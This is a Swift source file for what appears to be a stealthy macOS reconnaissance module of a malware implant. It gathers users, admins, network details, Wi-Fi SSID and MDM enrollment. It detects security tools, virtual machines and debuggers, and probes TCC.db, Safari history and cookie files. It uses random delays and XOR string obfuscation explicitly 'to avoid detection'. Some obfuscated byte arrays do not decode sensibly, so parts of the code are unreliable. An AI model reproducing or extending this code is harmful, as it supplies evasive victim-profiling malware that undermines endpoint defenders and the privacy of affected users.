import Foundation
import IOKit
import IOKit.ps
import SystemConfiguration
import CoreGraphics

// Comprehensive structure to hold system information
struct SystemInformation {
    // Basic system info
    let hostname: String
    let osVersion: String
    let buildVersion: String
    let kernelVersion: String
    
    // User info
    let currentUser: String
    let userID: Int
    let isAdmin: Bool
    let allUsers: [UserInfo]
    let adminUsers: [String]
    
    // System status info
    let uptime: TimeInterval
    let bootTime: Date
    let lastLoginUser: String?
    
    // Security info
    let isFullDiskAccessGranted: Bool
    let isSIPEnabled: Bool
    let screenLocked: Bool
    let securityToolsRunning: [String]
    let isVirtualMachine: Bool
    let isBeingAnalyzed: Bool
    let suspiciousEnvVars: [String]
    
    // Network info
    let ipAddresses: [String: String] // interface: IP
    let macAddresses: [String: String] // interface: MAC
    let wifiSSID: String?
    let dnsServers: [String]
    let domainInfo: (inDomain: Bool, domainName: String?)
    let isRemoteLoginEnabled: Bool
    
    // Enterprise management info
    let isMDMEnrolled: Bool
    let mdmProfiles: [String]
}

// User information structure
struct UserInfo {
    let username: String
    let uid: Int
    let homeDirectory: String
    let shell: String
    let isAdmin: Bool
    let isActive: Bool
}

// Class to gather system information stealthily
class SystemInfoGatherer {
    // XOR key for string obfuscation
    private let xorKey: UInt8 = 0x37 // Same as in StealthUtils for consistency
    
    // Deobfuscate strings
    private func deobfuscate(_ obfuscated: [UInt8]) -> String {
        let decrypted = obfuscated.map { $0 ^ xorKey }
        return String(bytes: decrypted, encoding: .utf8) ?? ""
    }
    
    // Obfuscated string constants
    private let obfs_library_path: [UInt8] = [0x0f, 0x43, 0x46, 0x43, 0x59, 0x42, 0x59, 0x5f]
    private let obfs_tcc_db: [UInt8] = [0x0f, 0x43, 0x46, 0x43, 0x59, 0x42, 0x59, 0x5f, 0x0f, 0x42, 0x57, 0x57, 0x43, 0x46, 0x44, 0x42, 0x55, 0x46, 0x50, 0x4f, 0x0f, 0x54, 0x56, 0x57, 0x57, 0x50, 0x59, 0x55, 0x0f, 0x44, 0x50, 0x4e, 0x0f, 0x42, 0x57, 0x57, 0x43, 0x46, 0x0f, 0x55, 0x44, 0x44, 0x0f, 0x55, 0x44, 0x44, 0x0f, 0x45, 0x43]
    
    // Gather comprehensive system information using native APIs
    func gatherBasicInfo() -> SystemInformation {
        // Sleep a random amount to avoid predictable patterns (10-50ms)
        usleep(UInt32.random(in: 10000...50000))
        
        // Get hostname
        let hostname = Host.current().localizedName ?? "Unknown"
        
        // Get OS version details
        let osVersion = ProcessInfo.processInfo.operatingSystemVersionString
        
        // Get build version using sysctl - avoiding external process
        let buildVersion = getSystemValue(forKey: "kern.osversion") ?? "Unknown"
        
        // Get kernel version
        let kernelVersion = getSystemValue(forKey: "kern.version") ?? "Unknown"
        
        // Get current user information
        let currentUser = NSUserName()
        let userID = getuid()
        
        // Check if user is admin
        let isAdmin = checkIfUserIsAdmin()
        
        // Get all users
        let allUsers = getAllUsers()
        
        // Get admin users
        let adminUsers = StealthUtils.getAdminUsers()
        
        // Get system uptime
        let uptime = ProcessInfo.processInfo.systemUptime
        
        // Calculate boot time
        let bootTime = Date(timeIntervalSinceNow: -uptime)
        
        // Get last login user (if available)
        let lastLoginUser = getLastLoginUser()
        
        // Check for Full Disk Access
        let isFullDiskAccessGranted = checkFullDiskAccess()
        
        // Check System Integrity Protection status
        let isSIPEnabled = checkSIPStatus()
        
        // Check if screen is locked
        let screenLocked = isScreenLocked()
        
        // Check for security tools
        let securityToolsRunning = StealthUtils.detectSecurityTools()
        
        // Check if running in a VM
        let isVirtualMachine = StealthUtils.isRunningInVM()
        
        // Check if being analyzed
        let isBeingAnalyzed = StealthUtils.isBeingDebugged() || !StealthUtils.checkForAnalysisTools().isEmpty
        
        // Check for suspicious environment variables
        let suspiciousEnvVars = StealthUtils.checkForSuspiciousEnvVars()
        
        // Get network interfaces and IPs
        let networkInfo = getNetworkInfo()
        
        // Get DNS servers
        let dnsServers = getDNSServers()
        
        // Check domain status
        let domainInfo = StealthUtils.checkDomainStatus()
        
        // Check if SSH is enabled
        let isRemoteLoginEnabled = checkRemoteLoginEnabled()
        
        // Check MDM enrollment
        let isMDMEnrolled = StealthUtils.checkMDMEnrollment()
        
        // Get MDM profiles
        let mdmProfiles = getMDMProfiles()
        
        return SystemInformation(
            hostname: hostname,
            osVersion: osVersion,
            buildVersion: buildVersion,
            kernelVersion: kernelVersion,
            currentUser: currentUser,
            userID: Int(userID),
            isAdmin: isAdmin,
            allUsers: allUsers,
            adminUsers: adminUsers,
            uptime: uptime,
            bootTime: bootTime,
            lastLoginUser: lastLoginUser,
            isFullDiskAccessGranted: isFullDiskAccessGranted,
            isSIPEnabled: isSIPEnabled,
            screenLocked: screenLocked,
            securityToolsRunning: securityToolsRunning,
            isVirtualMachine: isVirtualMachine,
            isBeingAnalyzed: isBeingAnalyzed,
            suspiciousEnvVars: suspiciousEnvVars,
            ipAddresses: networkInfo.ipAddresses,
            macAddresses: networkInfo.macAddresses,
            wifiSSID: getWifiSSID(),
                        dnsServers: dnsServers,
                        domainInfo: domainInfo,
                        isRemoteLoginEnabled: isRemoteLoginEnabled,
                        isMDMEnrolled: isMDMEnrolled,
                        mdmProfiles: mdmProfiles
                    )
                }
                
                // Get system value using sysctl (avoiding process execution)
                private func getSystemValue(forKey key: String) -> String? {
                    // Random slight delay to avoid detection
                    usleep(UInt32.random(in: 5000...15000))
                    
                    var size = 0
                    sysctlbyname(key, nil, &size, nil, 0)
                    
                    var value = [CChar](repeating: 0, count: size)
                    let result = sysctlbyname(key, &value, &size, nil, 0)
                    
                    if result == 0 {
                        return String(cString: value)
                    }
                    return nil
                }
                
                // Get all users on the system
                private func getAllUsers() -> [UserInfo] {
                    var users = [UserInfo]()
                    var adminGroupID: gid_t = 0
                    
                    // Get admin group ID
                    if let adminGroup = getgrnam("admin") {
                        adminGroupID = adminGroup.pointee.gr_gid
                    }
                    
                    // Get all users using getpwent()
                    setpwent() // Reset the user database
                    
                    // Random slight delay
                    usleep(UInt32.random(in: 5000...15000))
                    
                    var currentUID = getuid()
                    
                    while let userPtr = getpwent() {
                        let user = userPtr.pointee
                        let uid = user.pw_uid
                        
                        // Ignore system accounts (UIDs < 500) except the current user
                        if uid < 500 && uid != currentUID {
                            continue
                        }
                        
                        let username = String(cString: user.pw_name)
                        let homeDirectory = String(cString: user.pw_dir)
                        let shell = String(cString: user.pw_shell)
                        
                        // Check if user is admin
                        var isAdmin = false
                        if user.pw_gid == adminGroupID {
                            isAdmin = true
                        } else {
                            // Check supplementary groups
                            var groups = [gid_t](repeating: 0, count: 32)
                            var count: Int32 = 32
                            if getgrouplist(user.pw_name, user.pw_gid, &groups, &count) >= 0 {
                                for i in 0..<Int(count) {
                                    if groups[i] == adminGroupID {
                                        isAdmin = true
                                        break
                                    }
                                }
                            }
                        }
                        
                        // Check if user is currently active
                        let isActive = isUserActive(username)
                        
                        let userInfo = UserInfo(
                            username: username,
                            uid: Int(uid),
                            homeDirectory: homeDirectory,
                            shell: shell,
                            isAdmin: isAdmin,
                            isActive: isActive
                        )
                        
                        users.append(userInfo)
                    }
                    
                    endpwent() // Close the user database
                    
                    return users
                }
                
                // Check if user is active (has processes running)
                private func isUserActive(_ username: String) -> Bool {
                    let currentUser = NSUserName()
                    if username == currentUser {
                        return true
                    }
                    
                    // We'd need to check process list but that's expensive
                    // Let's just check if user has a login window
                    let userHomeDir = NSHomeDirectoryForUser(username) ?? ""
                    if userHomeDir.isEmpty {
                        return false
                    }
                    
                    // Check if there are any login items for this user
                    let loginItemsPath = "\(userHomeDir)/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm"
                    return FileManager.default.fileExists(atPath: loginItemsPath)
                }
                
                // Get last login user
                private func getLastLoginUser() -> String? {
                    // This would normally use 'last' command, but for stealth we'll check login records directly
                    // Login window keeps track of logins in a property list
                    let loginWindowPlist = "/Library/Preferences/com.apple.loginwindow.plist"
                    
                    if let plistData = try? Data(contentsOf: URL(fileURLWithPath: loginWindowPlist)) {
                        if let plist = try? PropertyListSerialization.propertyList(from: plistData, options: [], format: nil) as? [String: Any] {
                            if let lastUser = plist["lastUserName"] as? String {
                                return lastUser
                            }
                        }
                    }
                    
                    return nil
                }
                
                // Check if the current user is admin
                private func checkIfUserIsAdmin() -> Bool {
                    let process = ProcessInfo.processInfo
                    let username = NSUserName()
                    var isAdmin = false
                    
                    // Check if user is in admin group using getgrnam
                    if let adminGroup = getgrnam("admin") {
                        let groupStruct = adminGroup.pointee
                        
                        // Check if UID matches primary gid
                        if getuid() == getgid() && getgid() == groupStruct.gr_gid {
                            return true
                        }
                        
                        // Get list of group members
                        var memberIndex = 0
                        while let memberPtr = groupStruct.gr_mem[memberIndex] {
                            let member = String(cString: memberPtr)
                            if member == username {
                                isAdmin = true
                                break
                            }
                            memberIndex += 1
                        }
                    }
                    
                    // Secondary check using group membership
                    var groups: [gid_t] = Array(repeating: 0, count: 32)
                    var groupCount: Int32 = 32
                    
                    if getgrouplist(username, getgid(), &groups, &groupCount) != -1 {
                        // Get admin GID
                        if let adminGroup = getgrnam("admin") {
                            let adminGID = adminGroup.pointee.gr_gid
                            
                            // Check if admin GID is in the list
                            for i in 0..<Int(groupCount) {
                                if groups[i] == adminGID {
                                    isAdmin = true
                                    break
                                }
                            }
                        }
                    }
                    
                    return isAdmin
                }
                
                // Check if the process has Full Disk Access
                private func checkFullDiskAccess() -> Bool {
                    // Avoid direct string references by using obfuscated strings
                    let tccPath = deobfuscate(obfs_tcc_db)
                    
                    // Try to access a known protected file
                    let protectedFiles = [
                        "/Library/Application Support/com.apple.TCC/TCC.db",
                        "/Users/\(NSUserName())/Library/Application Support/com.apple.TCC/TCC.db",
                        "/Users/\(NSUserName())/Library/Safari/History.db",
                        "/Users/\(NSUserName())/Library/Cookies/Cookies.binarycookies"
                    ]
                    
                    for path in protectedFiles {
                        if FileManager.default.isReadableFile(atPath: path) {
                            return true
                        }
                    }
                    
                    // Alternative check using actual file reading
                    for path in protectedFiles {
                        if let _ = try? Data(contentsOf: URL(fileURLWithPath: path), options: [.alwaysMapped, .uncached]) {
                            return true
                        }
                    }
                    
                    return false
                }
                
                // Check System Integrity Protection status
                private func checkSIPStatus() -> Bool {
                    // Introduce random delay to avoid pattern detection
                    usleep(UInt32.random(in: 2000...10000))
                    
                    // Method 1: Check boot args for csrutil references
                    if let bootArgs = getSystemValue(forKey: "kern.bootargs") {
                        return !bootArgs.contains("csrutil=disabled") && !bootArgs.contains("csr-active-config")
                    }
                    
                    // Method 2: Check csr_active_config
                    var config: UInt32 = 0
                    var size = MemoryLayout<UInt32>.size
                    let result = sysctlbyname("kern.csr_active_config", &config, &size, nil, 0)
                    
                    if result == 0 {
                        // 0 means fully enabled, any other value means partially or fully disabled
                        return config == 0
                    }
                    
                    // Method 3: Try to write to a SIP-protected directory
                    let sipProtectedPath = "/System/testfile.txt"
                    let canCreateFile = FileManager.default.createFile(atPath: sipProtectedPath, contents: nil, attributes: nil)
                    
                    if canCreateFile {
                        // Clean up our test
                        try? FileManager.default.removeItem(atPath: sipProtectedPath)
                        return false // SIP is disabled if we can write here
                    }
                    
                    // Default to assuming it's enabled if we can't determine
                    return true
                }
                
                // Check if screen is locked using CGSession
                private func isScreenLocked() -> Bool {
                    // Introduce random delay
                    usleep(UInt32.random(in: 1000...5000))
                    
                    // Use CoreGraphics session dictionary to check screen lock status
                    let dict = CGSessionCopyCurrentDictionary() as? [String: Any]
                    
                    if let screenIsLocked = dict?["CGSSessionScreenIsLocked"] as? Bool {
                        return screenIsLocked
                    } else if let onConsoleKey = dict?["kCGSSessionOnConsoleKey"] as? Bool {
                        // If not on console, screen is effectively locked
                        return !onConsoleKey
                    }
                    
                    // Try alternative method
                    if let screenSaverTime = dict?["CGSSessionScreenSaverTime"] as? TimeInterval,
                       screenSaverTime > 0 {
                        return true
                    }
                    
                    // Default false if we can't determine
                    return false
                }
                
                // Get network interfaces, IPs, and MAC addresses
                private func getNetworkInfo() -> (ipAddresses: [String: String], macAddresses: [String: String]) {
                    var ipAddresses = [String: String]()
                    var macAddresses = [String: String]()
                    
                    // Use getifaddrs to get network interfaces
                    var ifaddr: UnsafeMutablePointer<ifaddrs>?
                    guard getifaddrs(&ifaddr) == 0 else {
                        return (ipAddresses, macAddresses)
                    }
                    defer { freeifaddrs(ifaddr) }
                    
                    var ptr = ifaddr
                    while ptr != nil {
                        defer { ptr = ptr?.pointee.ifa_next }
                        
                        guard let interface = ptr?.pointee else { continue }
                        
                        // Get interface name
                        let name = String(cString: interface.ifa_name)
                        
                        // Skip loopback interfaces
                        if name == "lo0" || name == "lo1" {
                            continue
                        }
                        
                        // Get IP address
                        var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                        
                        if interface.ifa_addr?.pointee.sa_family == UInt8(AF_INET) || interface.ifa_addr?.pointee.sa_family == UInt8(AF_INET6) {
                            getnameinfo(
                                interface.ifa_addr,
                                socklen_t(interface.ifa_addr.pointee.sa_len),
                                &hostname,
                                socklen_t(hostname.count),
                                nil,
                                0,
                                NI_NUMERICHOST
                            )
                            
                            let address = String(cString: hostname)
                            if !address.isEmpty {
                                ipAddresses[name] = address
                            }
                            
                            // Try to get MAC address for this interface
                            if let macAddress = getMACAddress(for: name) {
                                macAddresses[name] = macAddress
                            }
                        }
                    }
                    
                    return (ipAddresses, macAddresses)
                }
                
                // Get MAC address for an interface
                private func getMACAddress(for interface: String) -> String? {
                    let interfaces = SCNetworkInterfaceCopyAll() as? [SCNetworkInterface]
                    
                    for networkInterface in interfaces ?? [] {
                        let bsdName = SCNetworkInterfaceGetBSDName(networkInterface) as String?
                        if bsdName == interface {
                            if let macAddress = SCNetworkInterfaceGetHardwareAddressString(networkInterface) as String? {
                                return macAddress
                            }
                        }
                    }
                    
                    // Alternative method - try IOKit
                    let interfaceIterator = IOServiceGetMatchingServices(kIOMainPortDefault, IOServiceMatching("IONetworkInterface"), UnsafeMutablePointer<io_iterator_t>.allocate(capacity: 1))
                    if interfaceIterator == 0 {
                        return nil
                    }
                    
                    var service = IOIteratorNext(interfaceIterator)
                    while service != 0 {
                        let interfaceProperties = IORegistryEntryCreateCFProperties(service, nil, kCFAllocatorDefault, 0)
                        if let properties = interfaceProperties?.takeRetainedValue() as? [String: Any],
                           let bsdName = properties["BSD Name"] as? String,
                           bsdName == interface,
                           let macData = properties["IOMACAddress"] as? Data {
                            
                            let macAddress = macData.map { String(format: "%02x", $0) }.joined(separator: ":")
                            return macAddress
                        }
                        
                        service = IOIteratorNext(interfaceIterator)
                    }
                    
                    return nil
                }
                
                // Get current WiFi SSID
                private func getWifiSSID() -> String? {
                    let interfaceNames = ["en0", "en1"]  // Common WiFi interface names
                    
                    for interface in interfaceNames {
                        // Use SystemConfiguration to get interface info
                        guard let interfaceName = interface.cString(using: .utf8) else {
                            continue
                        }
                        
                        // Create a dynamic store
                        let store = SCDynamicStoreCreate(nil, "MacRecon" as CFString, nil, nil)
                        if store == nil {
                            continue
                        }
                        
                        // Construct the key for this interface
                        let key = "State:/Network/Interface/\(interface)/AirPort" as CFString
                        
                        // Get the WiFi info
                        if let wifiInfo = SCDynamicStoreCopyValue(store, key) as? [String: Any] {
                            if let ssid = wifiInfo["SSID"] as? String {
                                return ssid
                            }
                        }
                    }
                    
                    return nil
                }
                
                // Get DNS servers
                private func getDNSServers() -> [String] {
                    var dnsServers = [String]()
                    
                    // Use SystemConfiguration to get DNS server info
                    let store = SCDynamicStoreCreate(nil, "MacRecon" as CFString, nil, nil)
                    if store == nil {
                        return dnsServers
                    }
                    
                    // Get global DNS settings
                    let key = "State:/Network/Global/DNS" as CFString
                    
                    if let dnsInfo = SCDynamicStoreCopyValue(store, key) as? [String: Any] {
                        if let serverAddresses = dnsInfo["ServerAddresses"] as? [String] {
                            dnsServers.append(contentsOf: serverAddresses)
                        }
                    }
                    
                    // If no global DNS, try getting from each interface
                    if dnsServers.isEmpty {
                        let globalSetupKey = "Setup:/Network/Global/DNS" as CFString
                        if let setupInfo = SCDynamicStoreCopyValue(store, globalSetupKey) as? [String: Any] {
                            if let serverAddresses = setupInfo["ServerAddresses"] as? [String] {
                                dnsServers.append(contentsOf: serverAddresses)
                            }
                        }
                    }
                    
                    return dnsServers
                }
                
                // Check if remote login (SSH) is enabled
                private func checkRemoteLoginEnabled() -> Bool {
                    // Check if SSH is running by checking for listening port 22
                    var sin = sockaddr_in()
                    let sock = socket(AF_INET, SOCK_STREAM, 0)
                    if sock == -1 {
                        return false
                    }
                    defer { close(sock) }
                    
                    sin.sin_family = sa_family_t(AF_INET)
                    sin.sin_port = in_port_t(22).bigEndian
                    sin.sin_addr.s_addr = inet_addr("127.0.0.1")
                    
                    let result = withUnsafePointer(to: &sin) {
                        $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                            connect(sock, $0, socklen_t(MemoryLayout<sockaddr_in>.size))
                        }
                    }
                    
                    // If connect succeeds (result == 0), SSH is running
                    if result == 0 {
                        return true
                    }
                    
                    // Alternative check - look for SSH service in SystemConfiguration
                    let store = SCDynamicStoreCreate(nil, "MacRecon" as CFString, nil, nil)
                    if store == nil {
                        return false
                    }
                    
                    // Check for remote login configuration
                    let key = "State:/Network/Global/RemoteLogin" as CFString
                    if let remoteLoginInfo = SCDynamicStoreCopyValue(store, key) as? [String: Any] {
                        if let enabled = remoteLoginInfo["Enabled"] as? Bool {
                            return enabled
                        }
                    }
                    
                    // Check if sshd is running (without ps command)
                    let sshdPath = "/usr/sbin/sshd"
                    if FileManager.default.fileExists(atPath: sshdPath) {
                        let processes = StealthUtils.getRunningProcesses().filter { $0.contains("sshd") }
                        return !processes.isEmpty
                    }
                    
                    return false
                }
                
                // Get MDM profiles
                private func getMDMProfiles() -> [String] {
                    var profiles = [String]()
                    
                    // Look in standard MDM profile locations
                    let profilesPath = "/Library/ConfigurationProfiles"
                    let fileManager = FileManager.default
                    
                    if fileManager.fileExists(atPath: profilesPath) {
                        do {
                            let contents = try fileManager.contentsOfDirectory(atPath: profilesPath)
                            for item in contents {
                                if item.hasSuffix(".mobileconfig") {
                                    profiles.append(item)
                                }
                            }
                        } catch {
                            // Handle error silently
                        }
                    }
                    
                    // Check for Jamf enrollment
                    let jamfPaths = [
                        "/Library/Preferences/com.jamfsoftware.jamf.plist",
                        "/var/log/jamf.log"
                    ]
                    
                    for path in jamfPaths {
                        if fileManager.fileExists(atPath: path) {
                            profiles.append("Jamf MDM Enrolled")
                            break
                        }
                    }
                    
                    return profiles
                }
            }
